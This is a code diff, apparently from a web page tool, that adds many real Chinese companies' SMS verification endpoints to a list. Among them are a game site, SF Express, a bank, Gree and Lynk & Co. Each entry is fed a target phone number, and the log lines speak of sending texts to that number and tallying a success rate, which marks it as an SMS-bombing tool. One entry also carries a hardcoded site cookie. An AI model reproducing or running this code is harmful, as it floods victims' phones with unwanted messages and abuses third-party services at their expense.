+                    'X-Requested-With': 'mark.via.gp',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://wz.stcir.com/media/login',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': '_c_WBKFRo=Um85e2CQ74n7RglOYvKNpVP85EOJM3AGUPeLhrbt; _nb_ioWEgULi='
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber,
+                    'qrcode': ''
+
+                })
+            },
+            {
+                url: 'https://api-pt.4366.com/sms/sendCaptcha',
+                method: 'POST_JSON',
+                headers: () => ({
+                    'Host': 'api-pt.4366.com',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/plain, */*',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://www.4366.com',
+                    'X-Requested-With': 'mark.via.gp',
+                    'Sec-Fetch-Site': 'same-site',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://www.4366.com/gamePlay/?gid=958&sid=9051&referer=web_bd_ss_yw11_bscqhwt_14',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
+                }),
+                data: (phoneNumber, times) => ({
+                    'mobile': phoneNumber,
+                    'scene': 'register'
+
+                })
+            },
           // GET 请求
            {
                url: 'https://www.xxwolo.com/users/sendMessage',
@@ -3369,6 +3937,182 @@ button:hover {
                return phoneNumber ? `phone=${phoneNumber}` : '';
                
                 }
+            },
+            {
+                url: 'http://yth.bjsbdc.com.cn/ii-ui/v1/user/account/forget/register',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `userPhone=${phoneNumber}&type=register` : '';
+
+                }
+            },
+            {
+                url: 'https://www.jncfcj.com/fwzl-applet-client-api/sendSmsCaptcha',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `phone=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'https://m.luxshare-ict.com/api/Staff/GuestReserveLog/GetTelephoneCode',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `telephone=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'https://shopic.sf-express.com/user/crm/auth/sendUserCode',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `STOKEN=&UID=&USS=123&cityId=652900000&cityName=%E9%98%BF%E5%85%8B%E8%8B%8F%E5%9C%B0%E5%8C%BA&userPhone=${phoneNumber}&uss=123` : '';
+
+                }
+            },
+            {
+                url: 'https://ims.jjebank.cn/prd/mobile/user/openId/authCode',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `mobile=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'https://api-sms.gree.com/api/pub/autoapp-default-server-selfservice/api/v2/user/auth/code',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `phone=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'https://app-services.lynkco.com.cn/auth/mp/uc/send-Sms',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `mobile=${phoneNumber}&appId=wx4e8c1172fe132106` : '';
+
+                }
+            },
+            {
+                url: 'https://m.doctorpanda.com/panda-h5-web/miniapps/users/sendCode',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `_t=1733046158995&mobile=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'http://zydx.top/mob_code.php',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `type=reg&mob=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'https://www.isendmail.cn/member/login/mobile/code',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `mobile=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'https://wx.xjbtsy.com/user/smscode',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `phone=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'https://fd.cmdjh.com/wfmall//app/sendCode',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `nationalCode=0086&mobile=${phoneNumber}&companyId=1000001` : '';
+
+                }
+            },
+            {
+                url: 'https://vip.efw.cn//efwapp/Home/getCode',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `sMobile=${phoneNumber}&type=1` : '';
+
+                }
+            },
+            {
+                url: 'https://m.app.yunjiwan.com/api_android/Login/sendVerifiCodeApi',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `phoneNumber=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'https://ypc-backstage.zhongkediman.com/v2/user/sendSMSCode',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `phone=${phoneNumber}` : '';
+
+                }
+            },
+            {
+                url: 'http://btbzwap.wsxa.com:8092/userctrl/GetAjax.aspx',
+                method: 'GET',
+                headers: () => ({
+                    'Accept': 'application/json'
+                }),
+                data: (phoneNumber, times) => {
+                    return phoneNumber ? `type=SendCheckCodeD&value01=${phoneNumber}` : '';
+
+                }
             }
         ];
         
@@ -3551,7 +4295,7 @@ button:hover {
             isRunning = false;
             document.getElementById('sendBtn').style.display = 'inline-block';
             document.getElementById('stopBtn').style.display = 'none';
-            addLog('⏹️ 已停止发送', 'error');
+            addLog('⏹️ 已停止向 ${phoneNumber} 发送短信', 'error');
             console.log('⏹️ 用户主动停止');
         }
         
@@ -3810,7 +4554,7 @@ button:hover {
     if (wasRunning) {
         addLog(`📊 发送完成！`, 'system');
     } else {
-        addLog(`⏹️ 已停止发送`, 'system');
+        addLog(`⏹️ 已停止向 ${phoneNumber} 发送短信`, 'system');
     }
     
     // 计算成功率
